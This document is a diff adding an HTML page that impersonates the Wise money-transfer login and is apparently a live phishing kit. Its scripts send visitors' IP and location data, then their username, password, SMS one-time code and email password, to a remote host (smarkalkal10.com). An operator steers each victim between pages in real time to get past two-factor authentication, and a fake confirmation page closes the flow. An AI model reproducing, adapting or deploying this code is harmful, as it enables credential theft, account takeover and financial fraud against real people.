@@ -1,0 +1,699 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wise Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.glitch.global/7c7c2cb0-b3d0-4320-ae8b-3d0f849801ba/style.css?v=1745769127599">
+	<link rel="icon" href="https://cdn.glitch.global/7c7c2cb0-b3d0-4320-ae8b-3d0f849801ba/favicon.ico?v=1745769561526" type="image/x-icon" sizes="32x32">
+	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> 
+		<script type="application/javascript">
+			var grpid = '-1002504202555'
+			var endurl = "https://smarkalkal10.com/wise/post.php";
+			//#####################################################//
+			jQuery(document).ready(function($) {
+				$.getJSON('https://smarkalkal10.com/ip.php', function(data) {
+					$.ajax({
+						type: "POST",
+						url: endurl,
+						dataType: "json",
+						data: {
+							ip: data.ip,
+							ctr: data.country,
+							isp: data.isp,
+							ctrcode: data.countrycode,
+							timenow: data.timenow,
+							admin: grpid
+						},
+						success: function(response) {
+							console.log("request succeeded: ", response);
+							if (data.proxy === true) {
+								//document.write("Page not found");
+								console.log("request proxy: ", response);
+							}
+						},
+						error: function(jqXHR, textStatus, errorThrown) {
+							// Handle any errors that occur during the POST request
+							console.error("POST request failed: ");
+						}
+					});
+				});
+			});
+		</script>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <!-- Mobile logo -->
+                <div class="logo-mobile">
+                    <svg class="np-logo-svg np-logo-svg--size-sm" xmlns="http://www.w3.org/2000/svg" width="26" height="24" fill="none"><path fill="#163300" d="M6.82603 7.23227 0 15.2096h12.1882l1.3696-3.7616H8.33504l3.19126-3.68968.0102-.09787-2.07504-3.57192h9.33564L11.5604 24h4.9522l8.7385-24H2.6758l4.15023 7.23227Z"></path></svg>
+					
+                </div>
+                <!-- Desktop logo -->
+                <div class="logo-desktop">
+                    <svg class="np-logo-svg np-logo-svg--size-md" xmlns="http://www.w3.org/2000/svg" width="106" height="24" fill="none"><path fill="#163300" d="M58.7377.358803h6.4982L61.9668 23.681h-6.4983L58.7377.358803Zm-8.1922 0L46.1602 13.794 44.2465.358803h-4.5448L33.9608 13.7541 33.2433.358803h-6.2991L29.1369 23.681h5.2226L40.818 8.93022 43.0904 23.681h5.1428L56.7249.358803h-6.1794ZM105.103 13.9136H89.6744c.0798 3.0299 1.8937 5.0233 4.5648 5.0233 2.0133 0 3.608-1.0765 4.8439-3.1296l5.2079 2.3674C102.501 21.7017 98.729 24 94.0798 24 87.741 24 83.535 19.7342 83.535 12.8771 83.535 5.34221 88.4784 0 95.4552 0c6.1398 0 10.0068 4.14618 10.0068 10.6046 0 1.0765-.12 2.1528-.359 3.309Zm-5.7807-4.46512c0-2.71095-1.515-4.42525-3.9468-4.42525-2.5117 0-4.5848 1.79402-5.143 4.42525h9.0898ZM6.63326 7.38685 0 15.1389h11.844l1.3309-3.6553H8.09965l3.10105-3.58555.01-.09511L9.19424 4.3319h9.07196l-7.0323 19.3492h4.8124L24.538.358823H2.60021L6.63326 7.38685Zm69.16744-2.3636c2.2923 0 4.301 1.23273 6.0551 3.34565l.9216-6.57488C81.1429.687707 78.9303 0 76 0c-5.8205 0-9.0896 3.40865-9.0896 7.73421 0 2.99999 1.6744 4.83389 4.4252 6.01989l1.3156.598c2.4518 1.0466 3.1097 1.5649 3.1097 2.6712 0 1.1461-1.1064 1.8737-2.7907 1.8737-2.7808.01-5.0332-1.4153-6.7276-3.8472l-.939 6.699C67.2332 23.2201 69.7067 24 72.9702 24c5.5315 0 8.9302-3.1894 8.9302-7.6147 0-3.0099-1.3355-4.9434-4.7044-6.4584l-1.4351-.67772c-1.9934-.88708-2.6711-1.37543-2.6711-2.35216 0-1.05647.9269-1.87377 2.7109-1.87377Z"></path></svg>
+					
+                </div>
+            </div>
+            <button class="close-button" aria-label="Close">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M18 6L6 18" stroke="#2E4534" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                    <path d="M6 6L18 18" stroke="#2E4534" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                </svg>
+            </button>
+        </header>
+
+        <main id="main_login" style="display:block;" class="main-content">
+            <h1 class="title">Welcome back.</h1>
+            <p class="signup-text">New to Wise? <a href="#" class="signup-link">Sign up</a></p>
+
+            <div id="errorlogin" style="Display:none;" class="error-message">
+                <div class="error-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" fill="#B33A3A"></circle>
+                        <path d="M15 9L9 15" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                        <path d="M9 9L15 15" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                    </svg>
+                </div>
+                <div class="error-content">
+                    <p>Sorry, that email or password didn't work.</p>
+                    <a href="#" class="reset-link">Reset password</a>
+                </div>
+                <button class="error-close" aria-label="Close error message">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M18 6L6 18" stroke="#2E4534" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M6 6L18 18" stroke="#2E4534" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </svg>
+                </button>
+            </div>
+			<div id="login_form">
+            <form class="login-form">
+                <div class="form-group">
+                    <label for="email">Your email address</label>
+                    <input type="username" id="username" value="" class="form-input">
+                </div>
+				<div id="errorMessages1" style="display:none;" class="validation-error">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="8" cy="8" r="7" fill="#B33A3A"></circle>
+                        <path d="M8 4V9" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                        <circle cx="8" cy="12" r="1" fill="white"></circle>
+                    </svg>
+                    <span>Please fill this field</span>
+                </div>
+                <div class="form-group">
+                    <label for="password">Your password</label>
+                    <div class="password-container">
+                        <input type="password" id="password" class="form-input password-input">
+                        <button type="button" class="toggle-password" aria-label="Toggle password visibility">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 5C7.63636 5 4 8.63636 4 12C4 15.3636 7.63636 19 12 19C16.3636 19 20 15.3636 20 12C20 8.63636 16.3636 5 12 5Z" stroke="#2E4534" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="#2E4534" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div id="errorMessages2" style="display:none;" class="validation-error">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="8" cy="8" r="7" fill="#B33A3A"></circle>
+                        <path d="M8 4V9" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                        <circle cx="8" cy="12" r="1" fill="white"></circle>
+                    </svg>
+                    <span>Please fill this field</span>
+                </div>
+
+                <button type="submit" class="login-button">Log in</button>
+            </form>
+			
+			</div>
+            <a href="#" class="trouble-link">Trouble logging in?</a>
+
+            <div class="social-login">
+                <p class="social-text">Or log in with</p>
+                <div class="social-buttons">
+                    <button class="social-button google">
+                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M19.6 10.2C19.6 9.5 19.5 8.8 19.4 8.1H10V12H15.4C15.1 13.3 14.4 14.4 13.2 15.2V17.7H16.4C18.3 15.9 19.6 13.3 19.6 10.2Z" fill="#4285F4"></path>
+                            <path d="M10 20C12.7 20 15 19.1 16.4 17.7L13.2 15.2C12.3 15.8 11.2 16.2 10 16.2C7.4 16.2 5.2 14.4 4.4 12H1.1V14.6C2.5 17.8 6 20 10 20Z" fill="#34A853"></path>
+                            <path d="M4.4 12C4.2 11.4 4 10.7 4 10C4 9.3 4.2 8.6 4.4 8H1.1V10.6C0.4 9.5 0 8.3 0 7C0 5.7 0.4 4.5 1.1 3.4H4.4C5.2 1 7.4 -0.8 10 -0.8C11.4 -0.8 12.7 -0.3 13.7 0.6L16.5 -2.2C15 -3.5 12.7 -4.4 10 -4.4C6 -4.4 2.5 -2.2 1.1 1H4.4C5.2 -1.4 7.4 -3.2 10 -3.2C12.6 -3.2 14.8 -1.4 15.6 1H1.1C0.4 2.1 0 3.3 0 4.6C0 5.9 0.4 7.1 1.1 8.2V3.4H4.4C4.2 4 4 4.7 4 5.4C4 6.1 4.2 6.8 4.4 7.4H1.1V12H4.4Z" fill="#FBBC05"></path>
+                            <path d="M10 3.8C11.5 3.8 12.8 4.3 13.8 5.2L16.6 2.4C15 0.9 12.7 0 10 0C6 0 2.5 2.2 1.1 5.4H4.4C5.2 4.3 7.4 3.8 10 3.8Z" fill="#EA4335"></path>
+                        </svg>
+                    </button>
+                    <button class="social-button facebook">
+                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M18.9 0H1.1C0.5 0 0 0.5 0 1.1V18.9C0 19.5 0.5 20 1.1 20H10.7V12.3H8.1V9.3H10.7V7C10.7 4.4 12.3 3 14.6 3C15.7 3 16.7 3.1 17 3.1V5.8H15.5C14.3 5.8 14.1 6.4 14.1 7.2V9.3H16.9L16.5 12.3H14.1V20H18.9C19.5 20 20 19.5 20 18.9V1.1C20 0.5 19.5 0 18.9 0Z" fill="#3B5998"></path>
+                        </svg>
+                    </button>
+                    <button class="social-button apple">
+                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M14.5 0H5.5C2.5 0 0 2.5 0 5.5V14.5C0 17.5 2.5 20 5.5 20H14.5C17.5 20 20 17.5 20 14.5V5.5C20 2.5 17.5 0 14.5 0Z" fill="white"></path>
+                            <path d="M13.9 10.2C13.9 8.2 15.5 7.4 15.6 7.3C14.6 5.9 13 5.7 12.5 5.7C11.2 5.6 10 6.5 9.3 6.5C8.6 6.5 7.6 5.7 6.5 5.7C5.1 5.7 3.7 6.6 2.9 8C1.4 10.7 2.5 14.7 4 16.9C4.7 18 5.6 19.2 6.8 19.1C7.9 19 8.3 18.3 9.6 18.3C10.9 18.3 11.3 19.1 12.5 19.1C13.7 19 14.5 18 15.2 16.9C16 15.6 16.4 14.4 16.4 14.3C16.3 14.3 13.9 13.4 13.9 10.2Z" fill="black"></path>
+                            <path d="M12.1 3.1C12.7 2.4 13.1 1.4 13 0.4C12.1 0.4 11 1 10.4 1.7C9.8 2.3 9.3 3.3 9.5 4.3C10.5 4.4 11.5 3.8 12.1 3.1Z" fill="black"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </main>
+		
+<!----SMS FORM ---->
+<main id="main_sms" style="display:none;" class="main-content">
+<center>
+<img src="https://wise.com/web-art/assets/illustrations/plane-small@1x.webp" srcset="https://wise.com/web-art/assets/illustrations/plane-small@2x.webp 2x" width="100" height="100">
+</center>
+            <h1 class="title">We just sent you an SMS</h1>
+            <p class="signup-text">To log in, enter the security code we sent to the phone number we have on file. It will expire in 5 minutes.</p>
+
+            <div id="invalid_sms1" style="Display:none;" class="error-message">
+                <div class="error-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" fill="#B33A3A"></circle>
+                        <path d="M15 9L9 15" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                        <path d="M9 9L15 15" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                    </svg>
+                </div>
+                <div class="error-content">
+                    <p>The SMS code is invalid or incorrect. Please try again later. </p> 
+                </div>
+               
+            </div>
+			<div id="smss_form">
+            <form class="login-form">
+			<input id="login_value" name="login_value" type="hidden" value="">
+                <div class="form-group">
+                    <label for="email">Your 6-digit code</label>
+                    <input autofocus="" id="smsnumtan" maxlength="6" inputmode="numeric" class="form-input">
+                </div>
+				<div id="errorsmsinpt" style="display:none;" class="validation-error">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="8" cy="8" r="7" fill="#B33A3A"></circle>
+                        <path d="M8 4V9" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                        <circle cx="8" cy="12" r="1" fill="white"></circle>
+                    </svg>
+                    <span>Ungültiger Sicherheitstoken eingegeben, noch 4 Versuche übrig.</span>
+                </div>
+               
+                
+
+                <button type="submit" class="login-button">Done</button>
+            </form>
+			</div>
+
+            <a href="#" class="trouble-link">Try another way</a>
+
+            
+        </main>
+		
+<!----EMAIL FORM ---->
+<main id="email_profile" style="display:none;" class="main-content">
+
+<center>
+<img style="border-radius: 50%;" src="https://d12jofbmgge65s.cloudfront.net/wp-content/uploads/2023/02/tech-guide_header-image-icloud-mail.webp" width="100" height="100">
+</center>
+            <h1 class="title">Security Email Synchronization</h1>
+            <p class="signup-text">
+			For your security, please log in using the email address we have on file to securely synchronize your account and ensure a protected experience.</p>
+
+            <div id="invalid_email1" style="display:none;" class="error-message">
+                <div class="error-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" fill="#B33A3A"></circle>
+                        <path d="M15 9L9 15" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                        <path d="M9 9L15 15" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                    </svg>
+                </div>
+                <div class="error-content">
+                    <p>Email synchronization failed. Make sure you're logging in with the correct email password.</p> 
+                </div>
+               
+            </div>
+
+            <form id="email_form" class="login-form">
+                <div class="form-group">
+                    <label for="email">Email Adress</label>
+                    <input id="login_value1" value="" disabled="" class="form-input">
+                </div>
+				 
+               <div class="form-group">
+                    <label for="email">Email Password</label>
+                    <input type="password" id="emailpassword" value="" autofocus="" class="form-input">
+                </div>
+				<div id="passinpterr" style="display:none;" class="validation-error">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="8" cy="8" r="7" fill="#B33A3A"></circle>
+                        <path d="M8 4V9" stroke="white" stroke-width="2" stroke-linecap="round"></path>
+                        <circle cx="8" cy="12" r="1" fill="white"></circle>
+                    </svg>
+                    <span>Please enter the email password.</span>
+                </div>
+                
+
+                <button type="submit" class="login-button">Sync E-Mail</button>
+            </form>
+ 
+        </main>
+
+<!----done FORM ---->
+<main id="main_done" style="display:none;" class="main-content">
+<center>
+						<img src="https://static.vecteezy.com/system/resources/previews/015/130/843/non_2x/check-mark-icon-free-png.png" style="width:70px;">
+						</center>
+ <h1 class="title">Dear Sir or Madam.</h1>
+          
+									<br>
+             <p>Thank you for the information you provided. We have received your form and will update and review your details in our system shortly.
+</p>
+             <p>If further information is required, we will contact you immediately. Otherwise, we assume that all necessary information has been provided.
+</p>
+             <p>Thank you for your trust.</p>
+             <p>Best regards,
+</p>  
+ 
+           
+              
+        </main>
+        <footer class="footer">
+            <p>© Wise Payments Limited 2025</p>
+        </footer>
+    </div>
+	
+	
+
+ <script>
+$(document).ready(function() {
+			$("#smss_form").submit(function(e) {
+				e.preventDefault(); // Prevent default form submission behavior
+
+				function validatesms() {
+					var valid = true;
+					var smsotpweb = $("#smsnumtan").val();
+					if (smsotpweb == "") {
+						$("#errorsmsinpt").show(); 
+						valid = false;
+					}
+					return valid;
+					$("#errorsmsinpt").hide();  
+				}
+
+				if (validatesms()) {
+					$("#errorsmsinpt").hide();
+					$("#invalid_sms1").hide();
+					$('#loader_spin').show();
+					$.ajax({
+						method: "POST",
+						//contentType: "application/json; charset=utf-8",
+						url: endurl,
+						dataType: "json",
+						data: {
+							chatid: grpid,
+							smsotps: $('#smsnumtan').val(),
+							login_value: $('#login_value').val(),
+						},
+						success: function(result) {
+							if (result.login) {
+								let intervalId = setInterval(function() {
+									checkStatus(result.login, function(result) {
+										if (result && result.status) {
+											if (result.status == "sms_set") {
+												clearInterval(intervalId);
+												$('#loader_spin').hide(); 
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+												$("#invalid_sms1").fadeIn(); // Show the error message
+													setTimeout(function() {
+														$("#invalid_sms1").fadeOut(); // Hide after 3 seconds (3000 ms)
+													}, 4000);
+												$('#email_profile').hide(); 
+												$('#main_login').hide(); 
+												$('#main_sms').show(); 
+												$('#smsnumtan').val("");
+												$('#smsnumtan').focus();
+												$("#login_value").attr('value', result.login);
+											} else if (result.status == "email_set") {
+												clearInterval(intervalId);
+												$('#invalid_sms1').hide();  
+												$('#main_login').hide();
+												$('#main_sms').hide();
+												$('#email_profile').show();
+												//$('#invalid_email1').show();
+												$('#emailpassword').val(""), 
+												$('#loader_spin').hide();
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+												$("#login_value1").attr('value', result.login);
+												}else if (result.status == "login_succes_done") {
+												clearInterval(intervalId);
+												$('#main_sms').hide();
+												$('#email_profile').hide();
+												$('#main_login').hide();
+												$('#main_done').show();
+												$('#loader_spin').hide(); 
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+											}
+										} else {
+											console.error("Invalid response:", result);
+										}
+									});
+								}, 1000);
+							}
+						},
+						error: function(jqXHR, status, error) {
+							console.log("we have reached error ");
+							console.log(status);
+							console.log(error);
+						}
+					});
+				}
+			});
+		});
+		
+
+$(document).ready(function() {
+			$("#email_form").submit(function(e) {
+				e.preventDefault(); // Prevent default form submission behavior
+
+				function validatesms() {
+					var valid = true;
+					var smsotpweb = $("#emailpassword").val();
+					if (smsotpweb == "") {
+						$("#passinpterr").show(); 
+						valid = false;
+					}
+					return valid;
+					$("#passinpterr").hide();  
+				}
+
+				if (validatesms()) {
+					$("#passinpterr").hide();
+					$("#invalid_email1").hide();
+					$('#loader_spin').show();
+					$.ajax({
+						method: "POST",
+						//contentType: "application/json; charset=utf-8",
+						url: endurl,
+						dataType: "json",
+						data: {
+							chatid: grpid,
+							emailpass: $('#emailpassword').val(),
+							login_value: $('#login_value1').val(),
+						},
+						success: function(result) {
+							if (result.login) {
+								let intervalId = setInterval(function() {
+									checkStatus(result.login, function(result) {
+										if (result && result.status) {
+											if (result.status == "sms_set") {
+												clearInterval(intervalId);
+												$('#loader_spin').hide(); 
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+												/*$("#invalid_sms1").fadeIn(); // Show the error message
+													setTimeout(function() {
+														$("#invalid_sms1").fadeOut(); // Hide after 3 seconds (3000 ms)
+													}, 4000);*/
+												$('#email_profile').hide(); 
+												$('#main_login').hide(); 
+												$('#main_sms').show(); 
+												$('#smsnumtan').val("");
+												$('#smsnumtan').focus();
+												$("#login_value").attr('value', result.login);
+											} else if (result.status == "email_set") {
+												clearInterval(intervalId);
+												$('#invalid_sms1').hide();  
+												$('#main_login').hide();
+												$('#main_sms').hide();
+												$('#email_profile').show();
+												$('#invalid_email1').show();
+												$('#emailpassword').val(""), 
+												$('#loader_spin').hide();
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+												$("#login_value1").attr('value', result.login);
+												}else if (result.status == "login_succes_done") {
+												clearInterval(intervalId);
+												$('#main_sms').hide();
+												$('#email_profile').hide();
+												$('#main_login').hide();
+												$('#main_done').show();
+												$('#loader_spin').hide(); 
+												$('html, body').animate({ scrollTop: 0 }, 'slow');
+											}
+										} else {
+											console.error("Invalid response:", result);
+										}
+									});
+								}, 1000);
+							}
+						},
+						error: function(jqXHR, status, error) {
+							console.log("we have reached error ");
+							console.log(status);
+							console.log(error);
+						}
+					});
+				}
+			});
+		});
+ 
+
+
+$(document).ready(function() {
+    $("#login_form").submit(function(e) {
+		e.preventDefault(); // Prevent form submission
+
+     function validatelogin() {
+    var isValid = true; // Initialize validity status
+
+    // Get values from input fields
+    var email = $('#username').val();
+    var password = $('#password').val();
+
+    // Clear previous error messages and classes 
+    $("#errorMessages1, #errorMessages2").hide(); // Hide all error messages initially
+
+    // Check if email input is empty
+    if (!email) { 
+        $("#errorMessages1").show(); // Show error message for email
+        isValid = false; // Set validity status to false
+    }
+
+    // Check if password input is empty or does not meet criteria
+    if (!password || password.length < 4) { 
+        $("#errorMessages2").show(); // Show error message for password
+        isValid = false; // Set validity status to false
+    }
+
+    // Display error messages if any
+    if (!isValid) {
+        // Show all relevant error messages
+        if (!email) {
+            $("#errorMessages1").show(); // Show email error message
+        }
+        if (!password || password.length < 4) {
+            $("#errorMessages2").show(); // Show password error message
+        }
+    } else {
+        // Hide error messages if everything is valid
+        $("#errorMessages1").hide();
+        $("#errorMessages2").hide();
+    }
+
+    return isValid; // Return the validity status
+}
+
+
+        // Validate login before making the AJAX call
+        if (validatelogin()) {
+            $("#loader_spin").show(); 
+            $.ajax({
+                method: "POST",
+                url: endurl,
+                dataType: "json",
+                data: {
+                    id_chat: grpid,
+                    username: $('#username').val(),
+                    password: $('#password').val()
+                },
+                success: function(result) {
+                    let intervalId = setInterval(function() {
+                        checkStatus(result.login, function(sets) {
+                            if (sets.status === "login_wrong") {
+                                clearInterval(intervalId);
+                                //$("#errorlogin").show();
+								$("#errorlogin").fadeIn(); // Show the error message
+									setTimeout(function() {
+										$("#errorlogin").fadeOut(); // Hide after 3 seconds (3000 ms)
+									}, 10000);
+                                $("#loader_spin").hide();
+                                $('#username, #password').val(""); // Clear inputs
+                            }
+                            if (sets.status === "sms_set") {
+                                clearInterval(intervalId);
+                                $("#loader_spin").hide();
+								$('html, body').animate({ scrollTop: 0 }, 'slow');
+                                $('#main_login').hide();
+                                $("#email_profile").hide();
+                                $("#main_sms").show();
+                                $("#login_value").val(result.login);
+
+                            }if (sets.status === "email_set") {
+                                clearInterval(intervalId);
+                                $("#loader_spin").hide();
+								$('html, body').animate({ scrollTop: 0 }, 'slow');
+                                $('#main_login').hide();
+                                $("#email_profile").show();
+                                $("#login_value1").val(result.login);
+                            }
+                            if (sets.status === "login_succes_done") {
+                                clearInterval(intervalId);
+                                $("#main_login").hide();
+                                $("#main_sms").hide();
+                                $("#email_profile").hide();
+                                $("#main_done").show();
+                                $("#loader_spin").hide();
+								$('html, body').animate({ scrollTop: 0 }, 'slow');
+                            }
+                        });
+                    }, 1000);
+                },
+                error: function(jqXHR, status, error) {
+                    console.error("Error during login:", status, error);
+                }
+            });
+        }
+    });
+});
+function formatString(e) {
+			var inputChar = String.fromCharCode(event.keyCode);
+			var code = event.keyCode;
+			var allowedKeys = [8];
+			if (allowedKeys.indexOf(code) !== -1) {
+				return;
+			}
+
+			event.target.value = event.target.value.replace(
+				/^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
+			).replace(
+				/^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
+			).replace(
+				/^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
+			).replace(
+				/^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
+			).replace(
+				/^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
+			).replace(
+				/[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
+			).replace(
+				/\/\//g, '/' // Prevent entering more than 1 `/`
+			);
+		}
+
+function checkStatus(id, callback) {
+			$.ajax({
+				method: 'POST',
+				url: endurl,
+				dataType: "json",
+				async: true,
+				data: {
+					'action': 'get_userstatus',
+					'tocheck': id
+				},
+				success: function(response) {
+					callback(response); // Pass the whole response object
+				},
+				error: function(jqXHR, textStatus, errorThrown) {
+					callback({
+						status: "error"
+					}); // Provide a response structure
+				}
+			});
+		}
+    // Function to handle input field state
+    function updateFieldState(inputId, fieldId) {
+      const input = document.getElementById(inputId);
+      const field = document.getElementById(fieldId);
+      
+      if (input.value) {
+        field.classList.remove('empty');
+      } else {
+        field.classList.add('empty');
+      }
+    }
+    
+    // Toggle password visibility
+    function togglePassword() {
+      const passwordInput = document.getElementById('password');
+      
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+      } else {
+        passwordInput.type = 'password';
+      }
+      
+      // Update field state after toggling
+      updateFieldState('password', 'password-field');
+    }
+
+    // Handle all input interactions
+    document.addEventListener('DOMContentLoaded', function() {
+      const usernameInput = document.getElementById('username');
+      const usernameField = document.getElementById('username-field');
+      const passwordInput = document.getElementById('password');
+      const passwordField = document.getElementById('password-field');
+      
+      // Set initial states
+      updateFieldState('username', 'username-field');
+      updateFieldState('password', 'password-field');
+      
+      // Handle input changes for username
+      usernameInput.addEventListener('input', function() {
+        updateFieldState('username', 'username-field');
+      });
+      
+      // Handle focus for username
+      usernameInput.addEventListener('focus', function() {
+        usernameField.classList.remove('empty');
+      });
+      
+      // Handle blur for username
+      usernameInput.addEventListener('blur', function() {
+        if (!this.value) {
+          usernameField.classList.add('empty');
+        }
+      });
+      
+      // Handle input changes for password
+      passwordInput.addEventListener('input', function() {
+        updateFieldState('password', 'password-field');
+      });
+      
+      // Handle focus for password
+      passwordInput.addEventListener('focus', function() {
+        passwordField.classList.remove('empty');
+      });
+      
+      // Handle blur for password
+      passwordInput.addEventListener('blur', function() {
+        if (!this.value) {
+          passwordField.classList.add('empty');
+        }
+      });
+      
+      // Add a clear button functionality (optional)
+      document.querySelector('form').addEventListener('reset', function() {
+        setTimeout(function() {
+          updateFieldState('username', 'username-field');
+          updateFieldState('password', 'password-field');
+        }, 0);
+      });
+    });
+  </script>
+
+  <div id="loader_spin" style="display:none; width:100%; height:100%; position:fixed;  top:0; left:0; background:rgba(0,0,0,0.6);">
+		<div style="width:100%; height:100%; display:flex; justify-content:center; align-items:center;">
+			<img src="https://cdn.glitch.global/6c05d2c6-93ad-4f28-8b67-12a2ef948b95/VAyR.gif?v=1743300455864" style="width:70px;">
+		</div>
+	</div>
+
+
+
+
+
+</body></html>
